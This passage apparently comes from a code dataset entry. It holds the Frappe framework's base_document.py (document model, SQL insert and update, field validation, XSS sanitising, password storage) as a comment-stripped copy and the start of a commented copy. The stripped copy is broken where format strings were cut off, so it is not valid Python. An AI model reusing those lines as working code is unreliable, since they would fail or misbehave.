\"__onload\", \"_liked_by\", \"__run_link_triggers\"): \t\t\tif self.get(key): \t\t\t\tdoc[key]=self.get(key) \t\treturn doc \tdef as_json(self): \t\treturn frappe.as_json(self.as_dict()) \tdef get_table_field_doctype(self, fieldname): \t\treturn self.meta.get_field(fieldname).options \tdef get_parentfield_of_doctype(self, doctype): \t\tfieldname=[df.fieldname for df in self.meta.get_table_fields() if df.options==doctype] \t\treturn fieldname[0] if fieldname else None \tdef db_insert(self): \t\t\"\"\"INSERT the document(with valid columns) in the database.\"\"\" \t\tif not self.name: \t\t\t \t\t\tset_new_name(self) \t\tif not self.creation: \t\t\tself.creation=self.modified=now() \t\t\tself.created_by=self.modifield_by=frappe.session.user \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"insert into `tab{doctype}` \t\t\t\t({columns}) values({values})\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t\t\t\t\tcolumns=\", \".join([\"`\"+c+\"`\" for c in columns]), \t\t\t\t\tvalues=\", \".join([\"%s\"] * len(columns)) \t\t\t\t), list(d.values())) \t\texcept Exception as e: \t\t\tif e.args[0]==1062: \t\t\t\tif \"PRIMARY\" in cstr(e.args[1]): \t\t\t\t\tif self.meta.autoname==\"hash\": \t\t\t\t\t\t \t\t\t\t\t\tself.name=None \t\t\t\t\t\tself.db_insert() \t\t\t\t\t\treturn \t\t\t\t\traise frappe.DuplicateEntryError(self.doctype, self.name, e) \t\t\t\telif \"Duplicate\" in cstr(e.args[1]): \t\t\t\t\t \t\t\t\t\tself.show_unique_validation_message(e) \t\t\t\telse: \t\t\t\t\traise \t\t\telse: \t\t\t\traise \t\tself.set(\"__islocal\", False) \tdef db_update(self): \t\tif self.get(\"__islocal\") or not self.name: \t\t\tself.db_insert() \t\t\treturn \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\t \t\tname=d['name'] \t\tdel d['name'] \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"update `tab{doctype}` \t\t\t\tset{values} where name=%s\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t\t\t\t\tvalues=\", \".join([\"`\"+c+\"`=%s\" for c in columns]) \t\t\t\t), list(d.values()) +[name]) \t\texcept Exception as e: \t\t\tif e.args[0]==1062 and \"Duplicate\" in cstr(e.args[1]): \t\t\t\tself.show_unique_validation_message(e) \t\t\telse: \t\t\t\traise \tdef show_unique_validation_message(self, e): \t\ttype, value, traceback=sys.exc_info() \t\tfieldname, label=str(e).split(\"'\")[-2], None \t\t \t\t \t\tif \"unique_\" in fieldname: \t\t\tfieldname=fieldname.split(\"_\", 1)[1] \t\tdf=self.meta.get_field(fieldname) \t\tif df: \t\t\tlabel=df.label \t\tfrappe.msgprint(_(\"{0} must be unique\".format(label or fieldname))) \t\t \t\traise frappe.UniqueValidationError(self.doctype, self.name, e) \tdef update_modified(self): \t\t'''Update modified timestamp''' \t\tself.set(\"modified\", now()) \t\tfrappe.db.set_value(self.doctype, self.name, 'modified', self.modified, update_modified=False) \tdef _fix_numeric_types(self): \t\tfor df in self.meta.get(\"fields\"): \t\t\tif df.fieldtype==\"Check\": \t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\telif self.get(df.fieldname) is not None: \t\t\t\tif df.fieldtype==\"Int\": \t\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\t\telif df.fieldtype in(\"Float\", \"Currency\", \"Percent\"): \t\t\t\t\tself.set(df.fieldname, flt(self.get(df.fieldname))) \t\tif self.docstatus is not None: \t\t\tself.docstatus=cint(self.docstatus) \tdef _get_missing_mandatory_fields(self): \t\t\"\"\"Get mandatory fields that do not have any values\"\"\" \t\tdef get_msg(df): \t\t\tif df.fieldtype==\"Table\": \t\t\t\treturn \"{}:{}:{}\".format(_(\"Error\"), _(\"Data missing in table\"), _(df.label)) \t\t\telif self.parentfield: \t\t\t\treturn \"{}:{}{} \t\t\t\t\t_(\"Row\"), self.idx, _(\"Value missing for\"), _(df.label)) \t\t\telse: \t\t\t\treturn _(\"Error: Value missing for{0}:{1}\").format(_(df.parent), _(df.label)) \t\tmissing=[] \t\tfor df in self.meta.get(\"fields\",{\"reqd\":('=', 1)}): \t\t\tif self.get(df.fieldname) in(None,[]) or not strip_html(cstr(self.get(df.fieldname))).strip(): \t\t\t\tmissing.append((df.fieldname, get_msg(df))) \t\t \t\tif self.meta.istable: \t\t\tfor fieldname in(\"parent\", \"parenttype\"): \t\t\t\tif not self.get(fieldname): \t\t\t\t\tmissing.append((fieldname, get_msg(frappe._dict(label=fieldname)))) \t\treturn missing \tdef get_invalid_links(self, is_submittable=False): \t\t'''Returns list of invalid links and also updates fetch values if not set''' \t\tdef get_msg(df, docname): \t\t\tif self.parentfield: \t\t\t\treturn \"{} \t\t\telse: \t\t\t\treturn \"{}:{}\".format(_(df.label), docname) \t\tinvalid_links=[] \t\tcancelled_links=[] \t\tfor df in(self.meta.get_link_fields() \t\t\t\t+self.meta.get(\"fields\",{\"fieldtype\":('=', \"Dynamic Link\")})): \t\t\tdocname=self.get(df.fieldname) \t\t\tif docname: \t\t\t\tif df.fieldtype==\"Link\": \t\t\t\t\tdoctype=df.options \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw(_(\"Options not set for link field{0}\").format(df.fieldname)) \t\t\t\telse: \t\t\t\t\tdoctype=self.get(df.options) \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw(_(\"{0} must be set first\").format(self.meta.get_label(df.options))) \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\tfields_to_fetch=[ \t\t\t\t\t_df for _df in self.meta.get_fields_to_fetch(df.fieldname) \t\t\t\t\tif \t\t\t\t\t\tnot _df.get('fetch_if_empty') \t\t\t\t\t\tor(_df.get('fetch_if_empty') and not self.get(_df.fieldname)) \t\t\t\t] \t\t\t\tif not fields_to_fetch: \t\t\t\t\t \t\t\t\t\tvalues=frappe._dict(name=frappe.db.get_value(doctype, docname, \t\t\t\t\t\t'name', cache=True)) \t\t\t\telse: \t\t\t\t\tvalues_to_fetch=['name'] +[_df.fetch_from.split('.')[-1] \t\t\t\t\t\tfor _df in fields_to_fetch] \t\t\t\t\t \t\t\t\t\tvalues=frappe.db.get_value(doctype, docname, \t\t\t\t\t\tvalues_to_fetch, as_dict=True) \t\t\t\tif frappe.get_meta(doctype).issingle: \t\t\t\t\tvalues.name=doctype \t\t\t\tif values: \t\t\t\t\tsetattr(self, df.fieldname, values.name) \t\t\t\t\tfor _df in fields_to_fetch: \t\t\t\t\t\tif self.is_new() or self.docstatus !=1 or _df.allow_on_submit: \t\t\t\t\t\t\tsetattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]]) \t\t\t\t\tnotify_link_count(doctype, docname) \t\t\t\t\tif not values.name: \t\t\t\t\t\tinvalid_links.append((df.fieldname, docname, get_msg(df, docname))) \t\t\t\t\telif(df.fieldname !=\"amended_from\" \t\t\t\t\t\tand(is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable \t\t\t\t\t\tand cint(frappe.db.get_value(doctype, docname, \"docstatus\"))==2): \t\t\t\t\t\tcancelled_links.append((df.fieldname, docname, get_msg(df, docname))) \t\treturn invalid_links, cancelled_links \tdef _validate_selects(self): \t\tif frappe.flags.in_import: \t\t\treturn \t\tfor df in self.meta.get_select_fields(): \t\t\tif df.fieldname==\"naming_series\" or not(self.get(df.fieldname) and df.options): \t\t\t\tcontinue \t\t\toptions=(df.options or \"\").split(\"\\n\") \t\t\t \t\t\tif not filter(None, options): \t\t\t\tcontinue \t\t\t \t\t\tself.set(df.fieldname, cstr(self.get(df.fieldname)).strip()) \t\t\tvalue=self.get(df.fieldname) \t\t\tif value not in options and not(frappe.flags.in_test and value.startswith(\"_T-\")): \t\t\t\t \t\t\t\tprefix=_(\"Row \t\t\t\tlabel=_(self.meta.get_label(df.fieldname)) \t\t\t\tcomma_options='\", \"'.join(_(each) for each in options) \t\t\t\tfrappe.throw(_('{0}{1} cannot be \"{2}\". It should be one of \"{3}\"').format(prefix, label, \t\t\t\t\tvalue, comma_options)) \tdef _validate_constants(self): \t\tif frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants: \t\t\treturn \t\tconstants=[d.fieldname for d in self.meta.get(\"fields\",{\"set_only_once\":('=',1)})] \t\tif constants: \t\t\tvalues=frappe.db.get_value(self.doctype, self.name, constants, as_dict=True) \t\tfor fieldname in constants: \t\t\tdf=self.meta.get_field(fieldname) \t\t\t \t\t\tif df.fieldtype=='Date' or df.fieldtype=='Datetime': \t\t\t\tvalue=str(values.get(fieldname)) \t\t\telse: \t\t\t\tvalue =values.get(fieldname) \t\t\tif self.get(fieldname) !=value: \t\t\t\tfrappe.throw(_(\"Value cannot be changed for{0}\").format(self.meta.get_label(fieldname)), \t\t\t\t\tfrappe.CannotChangeConstantError) \tdef _validate_length(self): \t\tif frappe.flags.in_install: \t\t\treturn \t\tif self.meta.issingle: \t\t\t \t\t\treturn \t\tcolumn_types_to_check_length=('varchar', 'int', 'bigint') \t\tfor fieldname, value in iteritems(self.get_valid_dict()): \t\t\tdf=self.meta.get_field(fieldname) \t\t\tif not df or df.fieldtype=='Check': \t\t\t\t \t\t\t\tcontinue \t\t\tcolumn_type=type_map[df.fieldtype][0] or None \t\t\tdefault_column_max_length=type_map[df.fieldtype][1] or None \t\t\tif df and df.fieldtype in type_map and column_type in column_types_to_check_length: \t\t\t\tmax_length=cint(df.get(\"length\")) or cint(default_column_max_length) \t\t\t\tif len(cstr(value)) > max_length: \t\t\t\t\tif self.parentfield and self.idx: \t\t\t\t\t\treference=_(\"{0}, Row{1}\").format(_(self.doctype), self.idx) \t\t\t\t\telse: \t\t\t\t\t\treference=\"{0}{1}\".format(_(self.doctype), self.name) \t\t\t\t\tfrappe.throw(_(\"{0}: '{1}'({3}) will get truncated, as max characters allowed is{2}\")\\ \t\t\t\t\t\t.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_('Value too big')) \tdef _validate_update_after_submit(self): \t\t \t\tdb_values=frappe.get_doc(self.doctype, self.name).as_dict() \t\tfor key in self.as_dict(): \t\t\tdf=self.meta.get_field(key) \t\t\tdb_value=db_values.get(key) \t\t\tif df and not df.allow_on_submit and(self.get(key) or db_value): \t\t\t\tif df.fieldtype==\"Table\": \t\t\t\t\t \t\t\t\t\t \t\t\t\t\tself_value=len(self.get(key)) \t\t\t\t\tdb_value=len(db_value) \t\t\t\telse: \t\t\t\t\tself_value=self.get_value(key) \t\t\t\tif self_value !=db_value: \t\t\t\t\tfrappe.throw(_(\"Not allowed to change{0} after submission\").format(df.label), \t\t\t\t\t\tfrappe.UpdateAfterSubmitError) \tdef _sanitize_content(self): \t\t\"\"\"Sanitize HTML and Email in field values. Used to prevent XSS. \t\t\t-Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code' \t\t\"\"\" \t\tif frappe.flags.in_install: \t\t\treturn \t\tfor fieldname, value in self.get_valid_dict().items(): \t\t\tif not value or not isinstance(value, string_types): \t\t\t\tcontinue \t\t\tvalue=frappe.as_unicode(value) \t\t\tif(u\"<\" not in value and u\">\" not in value): \t\t\t\t \t\t\t\tcontinue \t\t\telif \"<!--markdown -->\" in value and not(\"<script\" in value or \"javascript:\" in value): \t\t\t\t \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tsanitized_value=value \t\t\tif df and df.get(\"fieldtype\") in(\"Data\", \"Code\", \"Small Text\") and df.get(\"options\")==\"Email\": \t\t\t\tsanitized_value=sanitize_email(value) \t\t\telif df and(df.get(\"ignore_xss_filter\") \t\t\t\t\t\tor(df.get(\"fieldtype\")==\"Code\" and df.get(\"options\")!=\"Email\") \t\t\t\t\t\tor df.get(\"fieldtype\") in(\"Attach\", \"Attach Image\") \t\t\t\t\t\t \t\t\t\t\t\tor self.docstatus==2 \t\t\t\t\t\tor(self.docstatus==1 and not df.get(\"allow_on_submit\"))): \t\t\t\tcontinue \t\t\telse: \t\t\t\tsanitized_value=sanitize_html(value, linkify=df.fieldtype=='Text Editor') \t\t\tself.set(fieldname, sanitized_value) \tdef _save_passwords(self): \t\t'''Save password field values in __Auth table''' \t\tif self.flags.ignore_save_passwords is True: \t\t\treturn \t\tfor df in self.meta.get('fields',{'fieldtype':('=', 'Password')}): \t\t\tif self.flags.ignore_save_passwords and df.fieldname in self.flags.ignore_save_passwords: continue \t\t\tnew_password=self.get(df.fieldname) \t\t\tif new_password and not self.is_dummy_password(new_password): \t\t\t\t \t\t\t\tset_encrypted_password(self.doctype, self.name, new_password, df.fieldname) \t\t\t\t \t\t\t\tself.set(df.fieldname, '*'*len(new_password)) \tdef get_password(self, fieldname='password', raise_exception=True): \t\tif self.get(fieldname) and not self.is_dummy_password(self.get(fieldname)): \t\t\treturn self.get(fieldname) \t\treturn get_decrypted_password(self.doctype, self.name, fieldname, raise_exception=raise_exception) \tdef is_dummy_password(self, pwd): \t\treturn ''.join(set(pwd))=='*' \tdef precision(self, fieldname, parentfield=None): \t\t\"\"\"Returns float precision for a particular field(or get global default). \t\t:param fieldname: Fieldname for which precision is required. \t\t:param parentfield: If fieldname is in child table.\"\"\" \t\tfrom frappe.model.meta import get_field_precision \t\tif parentfield and not isinstance(parentfield, string_types): \t\t\tparentfield=parentfield.parentfield \t\tcache_key=parentfield or \"main\" \t\tif not hasattr(self, \"_precision\"): \t\t\tself._precision=frappe._dict() \t\tif cache_key not in self._precision: \t\t\tself._precision[cache_key]=frappe._dict() \t\tif fieldname not in self._precision[cache_key]: \t\t\tself._precision[cache_key][fieldname]=None \t\t\tdoctype=self.meta.get_field(parentfield).options if parentfield else self.doctype \t\t\tdf=frappe.get_meta(doctype).get_field(fieldname) \t\t\tif df.fieldtype in(\"Currency\", \"Float\", \"Percent\"): \t\t\t\tself._precision[cache_key][fieldname]=get_field_precision(df, self) \t\treturn self._precision[cache_key][fieldname] \tdef get_formatted(self, fieldname, doc=None, currency=None, absolute_value=False, translated=False): \t\tfrom frappe.utils.formatters import format_value \t\tdf=self.meta.get_field(fieldname) \t\tif not df and fieldname in default_fields: \t\t\tfrom frappe.model.meta import get_default_df \t\t\tdf=get_default_df(fieldname) \t\tval=self.get(fieldname) \t\tif translated: \t\t\tval=_(val) \t\tif absolute_value and isinstance(val,(int, float)): \t\t\tval=abs(self.get(fieldname)) \t\tif not doc: \t\t\tdoc=getattr(self, \"parent_doc\", None) or self \t\treturn format_value(val, df=df, doc=doc, currency=currency) \tdef is_print_hide(self, fieldname, df=None, for_print=True): \t\t\"\"\"Returns true if fieldname is to be hidden for print. \t\tPrint Hide can be set via the Print Format Builder or in the controller as a list \t\tof hidden fields. Example \t\t\tclass MyDoc(Document): \t\t\t\tdef __setup__(self): \t\t\t\t\tself.print_hide=[\"field1\", \"field2\"] \t\t:param fieldname: Fieldname to be checked if hidden. \t\t\"\"\" \t\tmeta_df=self.meta.get_field(fieldname) \t\tif meta_df and meta_df.get(\"__print_hide\"): \t\t\treturn True \t\tprint_hide=0 \t\tif self.get(fieldname)==0 and not self.meta.istable: \t\t\tprint_hide=( df and df.print_hide_if_no_value) or( meta_df and meta_df.print_hide_if_no_value) \t\tif not print_hide: \t\t\tif df and df.print_hide is not None: \t\t\t\tprint_hide=df.print_hide \t\t\telif meta_df: \t\t\t\tprint_hide=meta_df.print_hide \t\treturn print_hide \tdef in_format_data(self, fieldname): \t\t\"\"\"Returns True if shown via Print Format::`format_data` property. \t\t\tCalled from within standard print format.\"\"\" \t\tdoc=getattr(self, \"parent_doc\", self) \t\tif hasattr(doc, \"format_data_map\"): \t\t\treturn fieldname in doc.format_data_map \t\telse: \t\t\treturn True \tdef reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields): \t\t\"\"\"If the user does not have permissions at permlevel > 0, then reset the values to original / default\"\"\" \t\tto_reset=[] \t\tfor df in high_permlevel_fields: \t\t\tif df.permlevel not in has_access_to and df.fieldtype not in display_fieldtypes: \t\t\t\tto_reset.append(df) \t\tif to_reset: \t\t\tif self.is_new(): \t\t\t\t \t\t\t\tref_doc=frappe.new_doc(self.doctype) \t\t\telse: \t\t\t\t \t\t\t\tif self.get('parent_doc'): \t\t\t\t\tself.parent_doc.get_latest() \t\t\t\t\tref_doc=[d for d in self.parent_doc.get(self.parentfield) if d.name==self.name][0] \t\t\t\telse: \t\t\t\t\tref_doc=self.get_latest() \t\t\tfor df in to_reset: \t\t\t\tself.set(df.fieldname, ref_doc.get(df.fieldname)) \tdef get_value(self, fieldname): \t\tdf=self.meta.get_field(fieldname) \t\tval=self.get(fieldname) \t\treturn self.cast(val, df) \tdef cast(self, value, df): \t\treturn cast_fieldtype(df.fieldtype, value) \tdef _extract_images_from_text_editor(self): \t\tfrom frappe.utils.file_manager import extract_images_from_doc \t\tif self.doctype !=\"DocType\": \t\t\tfor df in self.meta.get(\"fields\",{\"fieldtype\":('=', \"Text Editor\")}): \t\t\t\textract_images_from_doc(self, df.fieldname) def _filter(data, filters, limit=None): \t\"\"\"pass filters as: \t\t{\"key\": \"val\", \"key\":[\"!=\", \"val\"], \t\t\"key\":[\"in\", \"val\"], \"key\":[\"not in\", \"val\"], \"key\": \"^val\", \t\t\"key\": True(exists), \"key\": False(does not exist)}\"\"\" \tout, _filters=[],{} \tif not data: \t\treturn out \t \tif filters: \t\tfor f in filters: \t\t\tfval=filters[f] \t\t\tif not isinstance(fval,(tuple, list)): \t\t\t\tif fval is True: \t\t\t\t\tfval=(\"not None\", fval) \t\t\t\telif fval is False: \t\t\t\t\tfval=(\"None\", fval) \t\t\t\telif isinstance(fval, string_types) and fval.startswith(\"^\"): \t\t\t\t\tfval=(\"^\", fval[1:]) \t\t\t\telse: \t\t\t\t\tfval=(\"=\", fval) \t\t\t_filters[f]=fval \tfor d in data: \t\tadd=True \t\tfor f, fval in iteritems(_filters): \t\t\tif not frappe.compare(getattr(d, f, None), fval[0], fval[1]): \t\t\t\tadd=False \t\t\t\tbreak \t\tif add: \t\t\tout.append(d) \t\t\tif limit and(len(out)-1)==limit: \t\t\t\tbreak \treturn out ",
                    "sourceWithComments": "# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\nfrom six import iteritems, string_types\nimport datetime\nimport frappe, sys\nfrom frappe import _\nfrom frappe.utils import (cint, flt, now, cstr, strip_html,\n\tsanitize_html, sanitize_email, cast_fieldtype)\nfrom frappe.model import default_fields\nfrom frappe.model.naming import set_new_name\nfrom frappe.model.utils.link_count import notify_link_count\nfrom frappe.modules import load_doctype_module\nfrom frappe.model import display_fieldtypes\nfrom frappe.model.db_schema import type_map, varchar_len\nfrom frappe.utils.password import get_decrypted_password, set_encrypted_password\n\n_classes = {}\n\ndef get_controller(doctype):\n\t\"\"\"Returns the **class** object of the given DocType.\n\tFor `custom` type, returns `frappe.model.document.Document`.\n\n\t:param doctype: DocType name as string.\"\"\"\n\tfrom frappe.model.document import Document\n\tglobal _classes\n\n\tif not doctype in _classes:\n\t\tmodule_name, custom = frappe.db.get_value(\"DocType\", doctype, (\"module\", \"custom\"), cache=True) \\\n\t\t\tor [\"Core\", False]\n\n\t\tif custom:\n\t\t\t_class = Document\n\t\telse:\n\t\t\tmodule = load_doctype_module(doctype, module_name)\n\t\t\tclassname = doctype.replace(\" \", \"\").replace(\"-\", \"\")\n\t\t\tif hasattr(module, classname):\n\t\t\t\t_class = getattr(module, classname)\n\t\t\t\tif issubclass(_class, BaseDocument):\n\t\t\t\t\t_class = getattr(module, classname)\n\t\t\t\telse:\n\t\t\t\t\traise ImportError(doctype)\n\t\t\telse:\n\t\t\t\traise ImportError(doctype)\n\t\t_classes[doctype] = _class\n\n\treturn _classes[doctype]\n\nclass BaseDocument(object):\n\tignore_in_getter = (\"doctype\", \"_meta\", \"meta\", \"_table_fields\", \"_valid_columns\")\n\n\tdef __init__(self, d):\n\t\tself.update(d)\n\t\tself.dont_update_if_missing = []\n\n\t\tif hasattr(self, \"__setup__\"):\n\t\t\tself.__setup__()\n\n\t@property\n\tdef meta(self):\n\t\tif not hasattr(self, \"_meta\"):\n\t\t\tself._meta = frappe.get_meta(self.doctype)\n\n\t\treturn self._meta\n\n\tdef update(self, d):\n\t\tif \"doctype\" in d:\n\t\t\tself.set(\"doctype\", d.get(\"doctype\"))\n\n\t\t# first set default field values of base document\n\t\tfor key in default_fields:\n\t\t\tif key in d:\n\t\t\t\tself.set(key, d.get(key))\n\n\t\tfor key, value in iteritems(d):\n\t\t\tself.set(key, value)\n\n\t\treturn self\n\n\tdef update_if_missing(self, d):\n\t\tif isinstance(d, BaseDocument):\n\t\t\td = d.get_valid_dict()\n\n\t\tif \"doctype\" in d:\n\t\t\tself.set(\"doctype\", d.get(\"doctype\"))\n\t\tfor key, value in iteritems(d):\n\t\t\t# dont_update_if_missing is a list of fieldnames, for which, you don't want to set default value\n\t\t\tif (self.get(key) is None) and (value is not None) and (key not in self.dont_update_if_missing):\n\t\t\t\tself.set(key, value)\n\n\tdef get_db_value(self, key):\n\t\treturn frappe.db.get_value(self.doctype, self.name, key)\n\n\tdef get(self, key=None, filters=None, limit=None, default=None):\n\t\tif key:\n\t\t\tif isinstance(key, dict):\n\t\t\t\treturn _filter(self.get_all_children(), key, limit=limit)\n\t\t\tif filters:\n\t\t\t\tif isinstance(filters, dict):\n\t\t\t\t\tvalue = _filter(self.__dict__.get(key, []), filters, limit=limit)\n\t\t\t\telse:\n\t\t\t\t\tdefault = filters\n\t\t\t\t\tfilters = None\n\t\t\t\t\tvalue = self.__dict__.get(key, default)\n\t\t\telse:\n\t\t\t\tvalue = self.__dict__.get(key, default)\n\n\t\t\tif value is None and key not in self.ignore_in_getter \\\n\t\t\t\tand key in (d.fieldname for d in self.meta.get_table_fields()):\n\t\t\t\tself.set(key, [])\n\t\t\t\tvalue = self.__dict__.get(key)\n\n\t\t\treturn value\n\t\telse:\n\t\t\treturn self.__dict__\n\n\tdef getone(self, key, filters=None):\n\t\treturn self.get(key, filters=filters, limit=1)[0]\n\n\tdef set(self, key, value, as_value=False):\n\t\tif isinstance(value, list) and not as_value:\n\t\t\tself.__dict__[key] = []\n\t\t\tself.extend(key, value)\n\t\telse:\n\t\t\tself.__dict__[key] = value\n\n\tdef delete_key(self, key):\n\t\tif key in self.__dict__:\n\t\t\tdel self.__dict__[key]\n\n\tdef append(self, key, value=None):\n\t\tif value==None:\n\t\t\tvalue={}\n\t\tif isinstance(value, (dict, BaseDocument)):\n\t\t\tif not self.__dict__.get(key):\n\t\t\t\tself.__dict__[key] = []\n\t\t\tvalue = self._init_child(value, key)\n\t\t\tself.__dict__[key].append(value)\n\n\t\t\t# reference parent document\n\t\t\tvalue.parent_doc = self\n\n\t\t\treturn value\n\t\telse:\n\n\t\t\t# metaclasses may have arbitrary lists\n\t\t\t# which we can ignore\n\t\t\tif (getattr(self, '_metaclass', None)\n\t\t\t\tor self.__class__.__name__ in ('Meta', 'FormMeta', 'DocField')):\n\t\t\t\treturn value\n\n\t\t\traise ValueError(\n\t\t\t\t'Document for field \"{0}\" attached to child table of \"{1}\" must be a dict or BaseDocument, not {2} ({3})'.format(key,\n\t\t\t\t\tself.name, str(type(value))[1:-1], value)\n\t\t\t)\n\n\tdef extend(self, key, value):\n\t\tif isinstance(value, list):\n\t\t\tfor v in value:\n\t\t\t\tself.append(key, v)\n\t\telse:\n\t\t\traise ValueError\n\n\tdef remove(self, doc):\n\t\tself.get(doc.parentfield).remove(doc)\n\n\tdef _init_child(self, value, key):\n\t\tif not self.doctype:\n\t\t\treturn value\n\t\tif not isinstance(value, BaseDocument):\n\t\t\tif \"doctype\" not in value:\n\t\t\t\tvalue[\"doctype\"] = self.get_table_field_doctype(key)\n\t\t\t\tif not value[\"doctype\"]:\n\t\t\t\t\traise AttributeError(key)\n\t\t\tvalue = get_controller(value[\"doctype\"])(value)\n\t\t\tvalue.init_valid_columns()\n\n\t\tvalue.parent = self.name\n\t\tvalue.parenttype = self.doctype\n\t\tvalue.parentfield = key\n\n\t\tif value.docstatus is None:\n\t\t\tvalue.docstatus = 0\n\n\t\tif not getattr(value, \"idx\", None):\n\t\t\tvalue.idx = len(self.get(key) or []) + 1\n\n\t\tif not getattr(value, \"name\", None):\n\t\t\tvalue.__dict__['__islocal'] = 1\n\n\t\treturn value\n\n\tdef get_valid_dict(self, sanitize=True, convert_dates_to_str=False):\n\t\td = frappe._dict()\n\t\tfor fieldname in self.meta.get_valid_columns():\n\t\t\td[fieldname] = self.get(fieldname)\n\n\t\t\t# if no need for sanitization and value is None, continue\n\t\t\tif not sanitize and d[fieldname] is None:\n\t\t\t\tcontinue\n\n\t\t\tdf = self.meta.get_field(fieldname)\n\t\t\tif df:\n\t\t\t\tif df.fieldtype==\"Check\":\n\t\t\t\t\tif d[fieldname]==None:\n\t\t\t\t\t\td[fieldname] = 0\n\n\t\t\t\t\telif (not isinstance(d[fieldname], int) or d[fieldname] > 1):\n\t\t\t\t\t\td[fieldname] = 1 if cint(d[fieldname]) else 0\n\n\t\t\t\telif df.fieldtype==\"Int\" and not isinstance(d[fieldname], int):\n\t\t\t\t\td[fieldname] = cint(d[fieldname])\n\n\t\t\t\telif df.fieldtype in (\"Currency\", \"Float\", \"Percent\") and not isinstance(d[fieldname], float):\n\t\t\t\t\td[fieldname] = flt(d[fieldname])\n\n\t\t\t\telif df.fieldtype in (\"Datetime\", \"Date\", \"Time\") and d[fieldname]==\"\":\n\t\t\t\t\td[fieldname] = None\n\n\t\t\t\telif df.get(\"unique\") and cstr(d[fieldname]).strip()==\"\":\n\t\t\t\t\t# unique empty field should be set to None\n\t\t\t\t\td[fieldname] = None\n\n\t\t\t\tif isinstance(d[fieldname], list) and df.fieldtype != 'Table':\n\t\t\t\t\tfrappe.throw(_('Value for {0} cannot be a list').format(_(df.label)))\n\n\t\t\t\tif convert_dates_to_str and isinstance(d[fieldname], (datetime.datetime, datetime.time, datetime.timedelta)):\n\t\t\t\t\td[fieldname] = str(d[fieldname])\n\n\t\treturn d\n\n\tdef init_valid_columns(self):\n\t\tfor key in default_fields:\n\t\t\tif key not in self.__dict__:\n\t\t\t\tself.__dict__[key] = None\n\n\t\t\tif key in (\"idx\", \"docstatus\") and self.__dict__[key] is None:\n\t\t\t\tself.__dict__[key] = 0\n\n\t\tfor key in self.get_valid_columns():\n\t\t\tif key not in self.__dict__:\n\t\t\t\tself.__dict__[key] = None\n\n\tdef get_valid_columns(self):\n\t\tif self.doctype not in frappe.local.valid_columns:\n\t\t\tif self.doctype in (\"DocField\", \"DocPerm\") and self.parent in (\"DocType\", \"DocField\", \"DocPerm\"):\n\t\t\t\tfrom frappe.model.meta import get_table_columns\n\t\t\t\tvalid = get_table_columns(self.doctype)\n\t\t\telse:\n\t\t\t\tvalid = self.meta.get_valid_columns()\n\n\t\t\tfrappe.local.valid_columns[self.doctype] = valid\n\n\t\treturn frappe.local.valid_columns[self.doctype]\n\n\tdef is_new(self):\n\t\treturn self.get(\"__islocal\")\n\n\tdef as_dict(self, no_nulls=False, no_default_fields=False, convert_dates_to_str=False):\n\t\tdoc = self.get_valid_dict(convert_dates_to_str=convert_dates_to_str)\n\t\tdoc[\"doctype\"] = self.doctype\n\t\tfor df in self.meta.get_table_fields():\n\t\t\tchildren = self.get(df.fieldname) or []\n\t\t\tdoc[df.fieldname] = [d.as_dict(no_nulls=no_nulls) for d in children]\n\n\t\tif no_nulls:\n\t\t\tfor k in list(doc):\n\t\t\t\tif doc[k] is None:\n\t\t\t\t\tdel doc[k]\n\n\t\tif no_default_fields:\n\t\t\tfor k in list(doc):\n\t\t\t\tif k in default_fields:\n\t\t\t\t\tdel doc[k]\n\n\t\tfor key in (\"_user_tags\", \"__islocal\", \"__onload\", \"_liked_by\", \"__run_link_triggers\"):\n\t\t\tif self.get(key):\n\t\t\t\tdoc[key] = self.get(key)\n\n\t\treturn doc\n\n\tdef as_json(self):\n\t\treturn frappe.as_json(self.as_dict())\n\n\tdef get_table_field_doctype(self, fieldname):\n\t\treturn self.meta.get_field(fieldname).options\n\n\tdef get_parentfield_of_doctype(self, doctype):\n\t\tfieldname = [df.fieldname for df in self.meta.get_table_fields() if df.options==doctype]\n\t\treturn fieldname[0] if fieldname else None\n\n\tdef db_insert(self):\n\t\t\"\"\"INSERT the document (with valid columns) in the database.\"\"\"\n\t\tif not self.name:\n\t\t\t# name will be set by document class in most cases\n\t\t\tset_new_name(self)\n\n\t\tif not self.creation:\n\t\t\tself.creation = self.modified = now()\n\t\t\tself.created_by = self.modifield_by = frappe.session.user\n\n\t\td = self.get_valid_dict(convert_dates_to_str=True)\n\n\t\tcolumns = list(d)\n\t\ttry:\n\t\t\tfrappe.db.sql(\"\"\"insert into `tab{doctype}`\n\t\t\t\t({columns}) values ({values})\"\"\".format(\n\t\t\t\t\tdoctype = self.doctype,\n\t\t\t\t\tcolumns = \", \".join([\"`\"+c+\"`\" for c in columns]),\n\t\t\t\t\tvalues = \", \".join([\"%s\"] * len(columns))\n\t\t\t\t), list(d.values()))\n\t\texcept Exception as e:\n\t\t\tif e.args[0]==1062:\n\t\t\t\tif \"PRIMARY\" in cstr(e.args[1]):\n\t\t\t\t\tif self.meta.autoname==\"hash\":\n\t\t\t\t\t\t# hash collision? try again\n\t\t\t\t\t\tself.name = None\n\t\t\t\t\t\tself.db_insert()\n\t\t\t\t\t\treturn\n\n\t\t\t\t\traise frappe.DuplicateEntryError(self.doctype, self.name, e)\n\n\t\t\t\telif \"Duplicate\" in cstr(e.args[1]):\n\t\t\t\t\t# unique 